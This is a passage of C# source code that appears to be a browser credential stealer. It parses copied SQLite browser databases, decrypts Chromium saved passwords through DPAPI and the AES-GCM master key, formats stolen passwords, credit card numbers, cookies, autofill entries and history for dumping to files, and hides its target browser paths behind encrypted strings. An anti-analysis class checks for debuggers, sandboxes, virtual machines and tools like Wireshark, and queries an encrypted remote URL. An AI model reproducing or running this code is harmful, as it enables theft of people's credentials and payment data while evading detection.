									_masterTableEntries[num4 + (int)index1].ItemName = Encoding.Unicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
								else if ((long)_dbEncoding == 3L)
									_masterTableEntries[num4 + (int)index1].ItemName = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
							_masterTableEntries[num4 + (int)index1].RootNum = (long)ConvertToULong((int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2]), (int)numArray[3]);
							if ((long)_dbEncoding == 1L)
								_masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.Default.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
							else if ((long)_dbEncoding == 2L)
								_masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.Unicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
							else if ((long)_dbEncoding == 3L)
								_masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
						}
						break;
				}
			}
			catch
			{
			}
		}

		public bool ReadTable(string tableName)
		{
			try
			{
				int index1 = -1;
				for (int index2 = 0; index2 <= _masterTableEntries.Length; ++index2)
				{
					if (string.Compare(_masterTableEntries[index2].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
					{
						index1 = index2;
						break;
					}
				}
				if (index1 == -1)
					return false;
				string[] strArray = _masterTableEntries[index1].SqlStatement.Substring(_masterTableEntries[index1].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(',');
				for (int index2 = 0; index2 <= strArray.Length - 1; ++index2)
				{
					strArray[index2] = strArray[index2].TrimStart();
					int length = strArray[index2].IndexOf(' ');
					if (length > 0)
						strArray[index2] = strArray[index2].Substring(0, length);
					if (strArray[index2].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
					{
						Array.Resize(ref _fieldNames, index2 + 1);
						_fieldNames[index2] = strArray[index2];
					}
				}
				return ReadTableFromOffset((ulong)(_masterTableEntries[index1].RootNum - 1L) * _pageSize);
			}
			catch
			{
				return false;
			}
		}

		private ulong ConvertToULong(int startIndex, int size)
		{
			try
			{
				if (size > 8 | size == 0)
					return 0;
				ulong num = 0;
				for (int index = 0; index <= size - 1; ++index)
					num = num << 8 | (ulong)_fileBytes[startIndex + index];
				return num;
			}
			catch
			{
				return 0;
			}
		}

		private int Gvl(int startIdx)
		{
			try
			{
				if (startIdx > _fileBytes.Length)
					return 0;
				for (int index = startIdx; index <= startIdx + 8; ++index)
				{
					if (index > _fileBytes.Length - 1)
						return 0;
					if (((int)_fileBytes[index] & 128) != 128)
						return index;
				}
				return startIdx + 8;
			}
			catch
			{
				return 0;
			}
		}

		private long Cvl(int startIdx, int endIdx)
		{
			try
			{
				++endIdx;
				byte[] numArray = new byte[8];
				int num1 = endIdx - startIdx;
				bool flag = false;
				if (num1 == 0 | num1 > 9)
					return 0;
				if (num1 == 1)
				{
					numArray[0] = (byte)(_fileBytes[startIdx] & (uint)sbyte.MaxValue);
					return BitConverter.ToInt64(numArray, 0);
				}
				if (num1 == 9)
					flag = true;
				int num2 = 1;
				int num3 = 7;
				int index1 = 0;
				if (flag)
				{
					numArray[0] = _fileBytes[endIdx - 1];
					--endIdx;
					index1 = 1;
				}
				int index2 = endIdx - 1;
				while (index2 >= startIdx)
				{
					if (index2 - 1 >= startIdx)
					{
						numArray[index1] = (byte)(_fileBytes[index2] >> num2 - 1 & byte.MaxValue >> num2 | _fileBytes[index2 - 1] << num3);
						++num2;
						++index1;
						--num3;
					}
					else if (!flag)
						numArray[index1] = (byte)(_fileBytes[index2] >> num2 - 1 & byte.MaxValue >> num2);
					index2 += -1;
				}
				return BitConverter.ToInt64(numArray, 0);
			}
			catch
			{
				return 0;
			}
		}

		private static bool IsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		private struct RecordHeaderField
		{
			public long Size;
			public long Type;
		}

		private struct TableEntry
		{
			public string[] Content;
		}

		private struct SqliteMasterEntry
		{
			public string ItemName;
			public long RootNum;
			public string SqlStatement;
		}
	}
	internal sealed class SqlReader
	{
		public static SQLite ReadTable(string database, string table)
		{
			// If database not exists
			if (!File.Exists(database))
				return null;
			// Copy temp database
			string NewPath = Path.GetTempFileName() + ".dat";
			File.Copy(database, NewPath);
			// Read table rows
			SQLite SQLiteConnection = new SQLite(NewPath);
			SQLiteConnection.ReadTable(table);
			// Delete temp database
			File.Delete(NewPath);
			// If database corrupted
			if (SQLiteConnection.GetRowCount() == 65536)
				return null;
			// Return
			return SQLiteConnection;
		}
	}
	internal sealed class AntiAnalysis
	{

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetModuleHandle(string lpModuleName);
		private static readonly byte[] saltBytes = new byte[] { 255, 64, 191, 111, 23, 3, 113, 119, 231, 121, 252, 112, 79, 32, 114, 156 };
		private static readonly byte[] cryptKey = new byte[] { 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 76, 105, 109, 101, 114, 66, 111, 121, 47, 83, 116, 111, 114, 109, 75, 105, 116, 116, 121 };

		public static string Decrypt(byte[] bytesToBeDecrypted)
		{
			byte[] decryptedBytes = null;
			using (MemoryStream ms = new MemoryStream())
			{
				using (RijndaelManaged AES = new RijndaelManaged())
				{
					AES.KeySize = 256;
					AES.BlockSize = 128;
					var key = new Rfc2898DeriveBytes(cryptKey, saltBytes, 1000);
					AES.Key = key.GetBytes(AES.KeySize / 8);
					AES.IV = key.GetBytes(AES.BlockSize / 8);
					AES.Mode = CipherMode.CBC;
					using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
						cs.Close();
					}
					decryptedBytes = ms.ToArray();
				}
			}
			return Encoding.UTF8.GetString(decryptedBytes);
		}

		private static bool Debugger()
		{
			bool isDebuggerPresent = false;
			try
			{
				CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
				return isDebuggerPresent;
			}
			catch { }
			return isDebuggerPresent;
		}

		private static bool Emulator()
		{
			try
			{
				long ticks = DateTime.Now.Ticks;
				System.Threading.Thread.Sleep(10);
				if (DateTime.Now.Ticks - ticks < 10L)
					return true;
			}
			catch { }
			return false;
		}

		private static bool Hosting()
		{
			try
			{
				string status = new System.Net.WebClient()
					.DownloadString(
						Decrypt(new byte[] { 150, 74, 225, 199, 246, 42, 22, 12, 92, 2, 165, 125, 115, 20, 210, 212, 231, 87, 111, 21, 89, 98, 65, 247, 202, 71, 238, 24, 143, 201, 231, 207, 181, 18, 199, 100, 99, 153, 55, 114, 55, 39, 135, 191, 144, 26, 106, 93, }));
				return status.Contains("true");
			}
			catch { }
			return false;
		}

		private static bool Processes()
		{
			Process[] running_process_list = Process.GetProcesses();
			string[] selected_process_list = new string[]{
				"processhacker",
				"netstat", "netmon", "tcpview", "wireshark",
				"filemon", "regmon", "cain"
			};
			foreach (Process process in running_process_list)
				if (selected_process_list.Contains(process.ProcessName.ToLower()))
					return true;
			return false;
		}

		private static bool SandBox()
		{
			string[] dlls = new string[5]
			{
				"SbieDll.dll",
				"SxIn.dll",
				"Sf2.dll",
				"snxhk.dll",
				"cmdvrt32.dll"
			};
			foreach (string dll in dlls)
				if (GetModuleHandle(dll).ToInt32() != 0)
					return true;
			return false;
		}

		private static bool VirtualBox()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				try
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
							if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
								return true;

				}
				catch { return true; }
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
				if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
					return true;
			return false;
		}

		public static bool Run()
		{
			if (Hosting()) return true;
			if (Processes()) return true;
			if (VirtualBox()) return true;
			if (SandBox()) return true;
			if (Emulator()) return true;
			if (Debugger()) return true;
			return false;
		}

	}
	internal sealed class cBrowserUtils
	{
		private static string FormatPassword(Password pPassword)
		{
			return String.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
		}
		private static string FormatCreditCard(CreditCard cCard)
		{
			return String.Format("Type: {0}\nNumber: {1}\nExp: {2}\nHolder: {3}\n\n", Banking.DetectCreditCardType(cCard.sNumber), cCard.sNumber, cCard.sExpMonth + "/" + cCard.sExpYear, cCard.sName);
		}
		private static string FormatCookie(Cookie cCookie)
		{
			return String.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", cCookie.sHostKey, cCookie.sPath, cCookie.sExpiresUtc, cCookie.sName, cCookie.sValue);
		}
		private static string FormatAutoFill(AutoFill aFill)
		{
			return String.Format("{0}\t\n{1}\t\n\n", aFill.sName, aFill.sValue);
		}
		private static string FormatHistory(Site sSite)
		{
			return String.Format("### {0} ### ({1}) {2}\n", sSite.sTitle, sSite.sUrl, sSite.iCount);
		}
		private static string FormatBookmark(Bookmark bBookmark)
		{
			if (!string.IsNullOrEmpty(bBookmark.sUrl))
				return String.Format("### {0} ### ({1})\n", bBookmark.sTitle, bBookmark.sUrl);
			else
				return String.Format("### {0} ###\n", bBookmark.sTitle);
		}

		public static bool WriteCookies(List<Cookie> cCookies, string sFile)
		{
			try
			{
				foreach (Cookie cCookie in cCookies)
					File.AppendAllText(sFile, FormatCookie(cCookie));

				return true;
			}
			catch { return false; }
		}

		public static bool WriteAutoFill(List<AutoFill> aFills, string sFile)
		{
			try
			{
				foreach (AutoFill aFill in aFills)
					File.AppendAllText(sFile, FormatAutoFill(aFill));

				return true;
			}
			catch { return false; }
		}

		public static bool WriteHistory(List<Site> sHistory, string sFile)
		{
			try
			{
				foreach (Site sSite in sHistory)
					File.AppendAllText(sFile, FormatHistory(sSite));

				return true;
			}
			catch { return false; }
		}

		public static bool WriteBookmarks(List<Bookmark> bBookmarks, string sFile)
		{
			try
			{
				foreach (Bookmark bBookmark in bBookmarks)
					File.AppendAllText(sFile, FormatBookmark(bBookmark));

				return true;
			}
			catch { return false; }
		}

		public static bool WritePasswords(List<Password> pPasswords, string sFile)
		{
			try
			{
				foreach (Password pPassword in pPasswords)
				{

					if (pPassword.sUsername == "" || pPassword.sPassword == "")
						continue;
					File.AppendAllText(sFile, FormatPassword(pPassword));
				}

				return true;
			}
			catch { return false; }
		}

		public static bool WriteCreditCards(List<CreditCard> cCC, string sFile)
		{
			try
			{
				foreach (CreditCard aCC in cCC)
					File.AppendAllText(sFile, FormatCreditCard(aCC));

				return true;
			}
			catch { return false; }
		}
	}
	internal sealed class Crypto
	{
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			public int cbSize;
			public int dwPromptFlags;
			public IntPtr hwndApp;
			public string szPrompt;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			public int cbData;
			public IntPtr pbData;
		}

		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

		// Speed up decryption using master key
		private static string sPrevBrowserPath = "";
		private static byte[] sPrevMasterKey = new byte[] { };

		// Chrome < 80
		public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
		{
			DataBlob pPlainText = new DataBlob();
			DataBlob pCipherText = new DataBlob();
			DataBlob pEntropy = new DataBlob();

			CryptprotectPromptstruct pPrompt = new CryptprotectPromptstruct()
			{
				cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = (string)null
			};

			string sEmpty = string.Empty;

			try
			{
				try
				{
					if (bCipher == null)
						bCipher = new byte[0];

					pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
					pCipherText.cbData = bCipher.Length;
					Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);

				}
				catch { }

				try
				{
					if (bEntropy == null)
						bEntropy = new byte[0];

					pEntropy.pbData = Marshal.AllocHGlobal(bEntropy.Length);
					pEntropy.cbData = bEntropy.Length;

					Marshal.Copy(bEntropy, 0, pEntropy.pbData, bEntropy.Length);

				}
				catch { }

				CryptUnprotectData(ref pCipherText, ref sEmpty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);

				byte[] bDestination = new byte[pPlainText.cbData];
				Marshal.Copy(pPlainText.pbData, bDestination, 0, pPlainText.cbData);
				return bDestination;

			}
			catch { }
			finally
			{
				if (pPlainText.pbData != IntPtr.Zero)
					Marshal.FreeHGlobal(pPlainText.pbData);

				if (pCipherText.pbData != IntPtr.Zero)
					Marshal.FreeHGlobal(pCipherText.pbData);

				if (pEntropy.pbData != IntPtr.Zero)
					Marshal.FreeHGlobal(pEntropy.pbData);
			}
			return new byte[0];
		}
		// Chrome > 80
		public static byte[] GetMasterKey(string sLocalStateFolder)
		{

			string sLocalStateFile = sLocalStateFolder;

			if (sLocalStateFile.Contains("Opera"))
				sLocalStateFile += "\\Opera Stable\\Local State";
			else
				sLocalStateFile += "\\Local State";

			byte[] bMasterKey = new byte[] { };

			if (!File.Exists(sLocalStateFile))
				return null;

			// Ну карочи так быстрее работает, да
			if (sLocalStateFile != sPrevBrowserPath)
				sPrevBrowserPath = sLocalStateFile;
			else
				return sPrevMasterKey;


			var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"",
				System.Text.RegularExpressions.RegexOptions.Compiled).Matches(
				File.ReadAllText(sLocalStateFile));
			foreach (System.Text.RegularExpressions.Match prof in pattern)
			{
				if (prof.Success)
					bMasterKey = Convert.FromBase64String(prof.Groups[1].Value);
			}


			byte[] bRawMasterKey = new byte[bMasterKey.Length - 5];
			Array.Copy(bMasterKey, 5, bRawMasterKey, 0, bMasterKey.Length - 5);

			try
			{
				sPrevMasterKey = DPAPIDecrypt(bRawMasterKey);
				return sPrevMasterKey;
			}
			catch { return null; }
		}

		public static string GetUTF8(string sNonUtf8)
		{
			try
			{
				byte[] bData = Encoding.Default.GetBytes(sNonUtf8);
				return Encoding.UTF8.GetString(bData);
			}
			catch { return sNonUtf8; }
		}



		public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
		{
			byte[] bIV = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
			Array.Copy(bEncryptedData, 3, bIV, 0, 12);

			try
			{

				byte[] bBuffer = new byte[bEncryptedData.Length - 15];
				Array.Copy(bEncryptedData, 15, bBuffer, 0, bEncryptedData.Length - 15);
				byte[] bTag = new byte[16];
				byte[] bData = new byte[bBuffer.Length - bTag.Length];
				Array.Copy(bBuffer, bBuffer.Length - 16, bTag, 0, 16);
				Array.Copy(bBuffer, 0, bData, 0, bBuffer.Length - bTag.Length);
				cAesGcm aDecryptor = new cAesGcm();
				return aDecryptor.Decrypt(bMasterKey, bIV, null, bData, bTag);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex);
				return null;
			}
		}

		public static string EasyDecrypt(string sLoginData, string sPassword)
		{
			if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
			{
				byte[] bMasterKey = GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
				return Encoding.Default.GetString(DecryptWithKey(Encoding.Default.GetBytes(sPassword), bMasterKey));
			}
			else
				return Encoding.Default.GetString(DPAPIDecrypt(Encoding.Default.GetBytes(sPassword)));
		}

		public static string BrowserPathToAppName(string sLoginData)
		{
			if (sLoginData.Contains("Opera")) return "Opera";
			sLoginData.Replace(Paths.lappdata, "");
			return sLoginData.Split('\\')[1];
		}
	}
	internal sealed class Paths
	{
		// Encrypted Chromium browser path's
		public static string[] sChromiumPswPaths =
		{
			StringsCrypt.Decrypt(new byte[] { 191, 144, 50, 4, 176, 103, 41, 226, 163, 145, 184, 198, 37, 147, 201, 246, 15, 80, 188, 217, 224, 55, 94, 195, 60, 36, 195, 150, 34, 219, 225, 21 }), // \Chromium\User Data\
            StringsCrypt.Decrypt(new byte[] { 66, 190, 240, 189, 196, 112, 68, 209, 120, 66, 32, 128, 51, 187, 11, 106, 133, 186, 29, 203, 189, 184, 20, 80, 22, 110, 247, 203, 200, 139, 145, 252 }), // \Google\Chrome\User Data\
            StringsCrypt.Decrypt(new byte[] { 235, 71, 60, 105, 141, 89, 135, 64, 7, 55, 22, 242, 173, 137, 97, 111, 206, 79, 207, 177, 151, 51, 114, 222, 203, 93, 6, 206, 108, 141, 97, 221 }), // \Google(x86)\Chrome\User Data\
            StringsCrypt.Decrypt(new byte[] { 73, 24, 163, 202, 103, 163, 250, 131, 58, 254, 109, 200, 0, 101, 128, 192, 177, 205, 31, 137, 135, 207, 160, 228, 106, 123, 85, 109, 55, 255, 16, 57 }), // \Opera Software\
            StringsCrypt.Decrypt(new byte[] { 94, 125, 152, 164, 215, 224, 18, 60, 32, 98, 147, 169, 150, 48, 141, 211, 192, 129, 56, 148, 7, 104, 31, 144, 122, 249, 59, 25, 71, 162, 241, 69, 98, 84, 243, 115, 233, 26, 59, 183, 252, 7, 8, 237, 21, 222, 0, 157 }), // \MapleStudio\ChromePlus\User Data\
            StringsCrypt.Decrypt(new byte[] { 139, 161, 110, 219, 171, 17, 246, 186, 22, 213, 4, 215, 141, 253, 17, 173, 215, 53, 171, 41, 246, 99, 184, 29, 177, 20, 156, 97, 116, 105, 188, 242 }), // \Iridium\User Data\
            StringsCrypt.Decrypt(new byte[] { 190, 77, 154, 38, 44, 145, 237, 67, 174, 9, 133, 3, 58, 246, 93, 41, 23, 35, 235, 203, 108, 171, 65, 71, 56, 233, 66, 13, 202, 51, 79, 41 }), // 7Star\7Star\User Data
            StringsCrypt.Decrypt(new byte[] { 62, 210, 240, 33, 118, 184, 243, 141, 77, 133, 0, 235, 139, 86, 39, 25, 137, 185, 88, 124, 221, 174, 169, 88, 91, 11, 213, 207, 43, 146, 75, 243 }), //CentBrowser\User Data
            StringsCrypt.Decrypt(new byte[] { 62, 0, 196, 29, 187, 130, 95, 54, 171, 116, 232, 214, 233, 238, 169, 220, 87, 81, 58, 192, 55, 32, 9, 66, 192, 71, 163, 194, 155, 180, 1, 100 }), //Chedot\User Data
            StringsCrypt.Decrypt(new byte[] { 248, 132, 208, 253, 161, 159, 142, 173, 129, 48, 103, 48, 159, 71, 82, 190, 211, 175, 88, 121, 54, 47, 62, 205, 43, 35, 160, 92, 160, 146, 80, 219 }), // Vivaldi\User Data
            StringsCrypt.Decrypt(new byte[] { 160, 221, 244, 224, 234, 124, 235, 177, 76, 91, 97, 50, 47, 65, 63, 227, 74, 50, 249, 90, 53, 48, 13, 166, 106, 36, 144, 79, 133, 138, 58, 173 }), // Kometa\User Data
            StringsCrypt.Decrypt(new byte[] { 14, 78, 82, 180, 74, 84, 229, 48, 85, 125, 151, 44, 44, 245, 236, 69, 139, 52, 31, 12, 236, 152, 84, 192, 7, 253, 207, 160, 82, 205, 206, 216 }), // Elements Browser\User Data
            StringsCrypt.Decrypt(new byte[] { 80, 37, 192, 228, 231, 129, 178, 111, 104, 225, 219, 4, 152, 121, 224, 204, 47, 223, 134, 64, 65, 137, 96, 90, 39, 174, 0, 233, 231, 244, 222, 81 }), // Epic Privacy Browser\User Data
            StringsCrypt.Decrypt(new byte[] { 193, 191, 13, 199, 192, 122, 144, 200, 83, 128, 6, 28, 13, 132, 90, 7, 29, 217, 70, 36, 4, 149, 132, 62, 242, 153, 217, 247, 182, 13, 180, 100 }), // uCozMedia\Uran\User Data
            StringsCrypt.Decrypt(new byte[] { 191, 8, 54, 18, 102, 8, 237, 252, 81, 68, 237, 30, 28, 29, 171, 167, 37, 11, 209, 77, 139, 81, 1, 98, 185, 217, 150, 213, 121, 123, 68, 82, 53, 254, 128, 68, 133, 32, 78, 35, 53, 212, 98, 35, 135, 101, 229, 112, 43, 179, 17, 51, 150, 27, 145, 232, 59, 202, 27, 195, 245, 91, 244, 53 }), // Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer
            StringsCrypt.Decrypt(new byte[] { 124, 243, 34, 12, 158, 74, 249, 212, 5, 90, 133, 132, 35, 216, 217, 22, 217, 55, 243, 252, 51, 87, 241, 238, 86, 244, 62, 37, 95, 154, 18, 210, 62, 206, 164, 16, 182, 192, 15, 85, 48, 23, 118, 190, 110, 166, 231, 219 }), // CatalinaGroup\Citrio\User Data
            StringsCrypt.Decrypt(new byte[] { 112, 174, 206, 195, 60, 254, 140, 154, 222, 29, 174, 131, 97, 154, 190, 225, 101, 102, 44, 184, 116, 3, 222, 149, 173, 77, 23, 224, 108, 61, 110, 83 }), // Coowon\Coowon\User Data
            StringsCrypt.Decrypt(new byte[] { 168, 208, 166, 82, 192, 153, 44, 149, 17, 233, 52, 199, 126, 180, 93, 48, 18, 157, 146, 139, 52, 61, 229, 244, 233, 177, 174, 202, 13, 20, 68, 248 }), // liebao\User Data
            StringsCrypt.Decrypt(new byte[] { 15, 171, 27, 72, 143, 86, 53, 189, 140, 83, 1, 120, 66, 90, 66, 28, 128, 139, 207, 118, 135, 205, 39, 142, 89, 231, 22, 111, 194, 199, 245, 22 }), // QIP Surf\User Data
            StringsCrypt.Decrypt(new byte[] { 64, 252, 183, 118, 9, 181, 137, 115, 42, 20, 107, 204, 169, 49, 101, 240, 160, 210, 28, 182, 65, 1, 170, 136, 179, 86, 242, 2, 40, 236, 39, 92 }), // Orbitum\User Data
            StringsCrypt.Decrypt(new byte[] { 163, 202, 80, 117, 26, 124, 142, 96, 200, 150, 88, 164, 24, 244, 151, 69, 200, 214, 2, 103, 223, 49, 243, 222, 70, 137, 79, 85, 208, 132, 160, 180 }), // Comodo\Dragon\User Data
            StringsCrypt.Decrypt(new byte[] { 190, 180, 48, 187, 130, 241, 22, 142, 148, 81, 86, 118, 125, 198, 67, 134, 168, 170, 218, 153, 252, 65, 45, 99, 146, 136, 184, 169, 8, 176, 254, 158 }), // Amigo\User\User Data
            StringsCrypt.Decrypt(new byte[] { 134, 62, 128, 238, 85, 244, 104, 139, 79, 49, 203, 166, 37, 19, 150, 80, 195, 12, 211, 168, 230, 85, 8, 141, 82, 13, 200, 163, 193, 61, 249, 18 }), // Torch\User Data
            StringsCrypt.Decrypt(new byte[] { 189, 176, 161, 91, 124, 7, 222, 38, 230, 226, 175, 16, 213, 160, 182, 221, 133, 88, 75, 233, 51, 39, 227, 90, 53, 56, 98, 251, 118, 191, 198, 4, 38, 3, 145, 152, 83, 170, 23, 225, 66, 207, 208, 132, 167, 27, 63, 43 }), // Yandex\YandexBrowser\User Data
            StringsCrypt.Decrypt(new byte[] { 13, 6, 120, 217, 132, 74, 167, 141, 165, 239, 104, 198, 115, 212, 98, 108, 230, 36, 207, 96, 112, 142, 221, 116, 224, 149, 170, 246, 80, 191, 143, 130 }), // Comodo\User Data
            StringsCrypt.Decrypt(new byte[] { 59, 208, 82, 153, 38, 145, 53, 186, 128, 79, 177, 14, 101, 235, 46, 148, 230, 52, 225, 181, 155, 81, 183, 213, 37, 54, 26, 129, 9, 171, 114, 201 }), // 360Browser\Browser\User Data
            StringsCrypt.Decrypt(new byte[] { 210, 110, 31, 64, 140, 5, 137, 32, 239, 70, 133, 139, 182, 28, 116, 149, 137, 179, 177, 211, 237, 32, 56, 74, 238, 183, 94, 93, 153, 52, 180, 166 }), // Maxthon3\User Data
            StringsCrypt.Decrypt(new byte[] { 127, 26, 51, 8, 51, 33, 160, 156, 24, 156, 118, 176, 53, 117, 49, 254, 255, 109, 181, 189, 202, 185, 182, 67, 39, 65, 51, 52, 173, 18, 238, 176 }), // K-Melon\User Data
            StringsCrypt.Decrypt(new byte[] { 199, 54, 29, 56, 170, 241, 14, 100, 162, 6, 72, 161, 113, 24, 82, 202, 17, 115, 136, 234, 7, 212, 113, 6, 151, 135, 75, 247, 247, 173, 203, 24 }), // Sputnik\Sputnik\User Data
            StringsCrypt.Decrypt(new byte[] { 83, 72, 133, 227, 83, 110, 30, 229, 236, 41, 214, 6, 199, 29, 46, 177, 241, 54, 120, 70, 151, 178, 31, 141, 61, 90, 213, 35, 23, 246, 13, 83 }), // Nichrome\User Data
            StringsCrypt.Decrypt(new byte[] { 104, 246, 234, 64, 237, 165, 148, 53, 5, 137, 111, 113, 171, 60, 134, 245, 123, 46, 6, 132, 64, 48, 18, 15, 251, 4, 115, 37, 170, 131, 50, 128 }), // CocCoc\Browser\User Data
            StringsCrypt.Decrypt(new byte[] { 133, 151, 179, 255, 133, 211, 180, 66, 84, 153, 153, 102, 25, 119, 175, 75, 37, 11, 232, 242, 215, 134, 15, 104, 97, 24, 243, 15, 72, 21, 214, 148 }), // Uran\User Data
            StringsCrypt.Decrypt(new byte[] { 101, 40, 56, 105, 89, 211, 223, 54, 3, 104, 25, 89, 1, 122, 183, 190, 84, 174, 204, 213, 56, 142, 216, 145, 19, 148, 221, 119, 63, 0, 14, 109 }), // Chromodo\User Data
            StringsCrypt.Decrypt(new byte[] { 175, 246, 73, 246, 49, 254, 11, 23, 218, 203, 11, 198, 89, 205, 176, 84, 56, 68, 227, 191, 99, 91, 219, 129, 239, 50, 148, 130, 220, 188, 164, 21 }), // Mail.Ru\Atom\User Data
            StringsCrypt.Decrypt(new byte[] { 75, 24, 125, 65, 43, 53, 196, 162, 16, 125, 167, 152, 46, 91, 169, 88, 249, 110, 125, 80, 24, 9, 189, 218, 64, 40, 44, 44, 182, 21, 14, 72, 150, 141, 179, 43, 1, 75, 180, 171, 191, 237, 98, 81, 222, 4, 48, 130 }), // BraveSoftware\Brave-Browser\User Data
        };

		// Encrypted Firefox based browsers path's
		public static string[] sGeckoBrowserPaths = new string[]
		{
			StringsCrypt.Decrypt(new byte[] { 25, 165, 254, 213, 23, 104, 22, 140, 50, 180, 13, 111, 144, 203, 43, 22, 130, 192, 203, 173, 216, 174, 203, 198, 119, 247, 195, 48, 28, 15, 102, 251, }), // \Mozilla\Firefox
            StringsCrypt.Decrypt(new byte[] { 57, 61, 215, 94, 116, 76, 131, 196, 108, 135, 85, 159, 219, 37, 127, 47, }), // \Waterfox
            StringsCrypt.Decrypt(new byte[] { 131, 14, 255, 168, 2, 46, 205, 11, 17, 125, 39, 71, 131, 241, 39, 192, }), // \\K-Meleon
            StringsCrypt.Decrypt(new byte[] { 78, 198, 187, 164, 195, 98, 111, 181, 201, 137, 136, 6, 94, 66, 48, 57, }), // \Thunderbird
            StringsCrypt.Decrypt(new byte[] { 15, 197, 238, 219, 54, 25, 176, 66, 84, 247, 8, 76, 207, 35, 202, 142, 147, 45, 233, 227, 100, 60, 238, 136, 160, 192, 140, 59, 107, 214, 244, 202, }), // \Comodo\IceDragon
            StringsCrypt.Decrypt(new byte[] { 153, 86, 193, 227, 188, 184, 28, 41, 79, 37, 113, 236, 3, 244, 237, 150, 134, 53, 212, 66, 69, 82, 197, 61, 225, 15, 130, 151, 189, 246, 126, 205, }), // \8pecxstudios\Cyberfox
            StringsCrypt.Decrypt(new byte[] { 196, 189, 143, 56, 114, 249, 19, 12, 92, 176, 156, 66, 203, 221, 53, 72, 131, 177, 110, 160, 95, 218, 63, 31, 217, 46, 132, 4, 211, 175, 216, 239, }), // \NETGATE Technologies\BlackHaw
            StringsCrypt.Decrypt(new byte[] { 156, 253, 178, 143, 188, 39, 142, 60, 241, 99, 247, 116, 211, 99, 5, 119, 40, 243, 72, 59, 0, 175, 243, 243, 94, 202, 67, 206, 126, 176, 47, 182, 145, 87, 37, 85, 76, 138, 57, 238, 162, 167, 29, 248, 230, 180, 133, 57, }), // \Moonchild Productions\Pale Moon
        };

		// Encrypted Edge browser path
		public static string EdgePath = StringsCrypt.Decrypt(new byte[] { 156, 195, 223, 143, 60, 17, 189, 255, 52, 135, 177, 35, 20, 86, 6, 119, 131, 100, 33, 246, 174, 234, 146, 72, 65, 90, 212, 244, 233, 203, 145, 176 }); // Microsoft\Edge\User Data

		// Appdata
		public static string appdata = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData);
		public static string lappdata = System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData);
	}
	internal sealed class StringsCrypt
	{
		// Salt
		private static readonly byte[] saltBytes = new byte[] { 255, 64, 191, 111, 23, 3, 113, 119, 231, 121, 252, 112, 79, 32, 114, 156 };
		private static readonly byte[] cryptKey = new byte[] { 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 76, 105, 109, 101, 114, 66, 111, 121, 47, 83, 116, 111, 114, 109, 75, 105, 116, 116, 121 };
